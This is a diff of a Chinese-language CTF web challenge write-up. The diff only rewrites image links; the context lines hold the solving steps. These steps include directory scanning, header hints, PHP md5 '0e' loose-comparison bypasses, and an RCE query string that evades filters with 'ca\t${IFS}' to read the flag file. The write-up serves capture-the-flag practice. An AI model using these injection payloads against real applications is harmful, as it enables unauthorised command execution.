@@ -1,45 +1,45 @@
-![[Pasted image 20221121210931.png]]
+![](<./img/Pasted image 20221121210931.png>)
 
 ---
 首页长这样
 
-![[Pasted image 20221121210920.png]]
+![](<./img/Pasted image 20221121210920.png>)
 
 很怪，标题编码出了点问题，burp里面又能正确显示
 
-![[Pasted image 20221121211528.png]]
+![](<./img/Pasted image 20221121211528.png>)
 
 有报错，但没看懂.jpg
 
 用`dirsearch`扫扫看
 
-![[Pasted image 20221121214141.png]]
+![](<./img/Pasted image 20221121214141.png>)
 ```php
 /robots.txt
 ```
-![[Pasted image 20221121212704.png]]
+![](<./img/Pasted image 20221121212704.png>)
 
 ```php
 /fAke_f1agggg.php
 ```
-![[Pasted image 20221121212912.png]]
+![](<./img/Pasted image 20221121212912.png>)
 
 是假的呜呜呜～
 
 但是翻响应头翻到了点东西
 
-![[Pasted image 20221121212901.png]]
+![](<./img/Pasted image 20221121212901.png>)
 
 ```php
 /fl4g.php
 ```
-![[Pasted image 20221121213632.png]]
+![](<./img/Pasted image 20221121213632.png>)
 
 hmmm，为啥又是烦人的编码问题啊啊啊
 
 搜了下，最后害得先进的浏览器收拾摊子
 
-![[Pasted image 20221121213808.png]]
+![](<./img/Pasted image 20221121213808.png>)
 
 ---
 ```php
@@ -127,10 +127,10 @@ print(t)
 ```php
 /?num=1e5&md5=0e215962017&get_flag=ls
 ```
-![[Pasted image 20221121224622.png]]
+![](<./img/Pasted image 20221121224622.png>)
 ```php
 /?num=1e5&md5=0e215962017&get_flag=ca\t${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
 ```
-![[Pasted image 20221121224740.png]]
+![](<./img/Pasted image 20221121224740.png>)
 
 #Web #PHP #字符 #encoding #目录扫描 #HTTP #Header #代码审计 #function #bypass #md5 #Misc #shell #RCE 
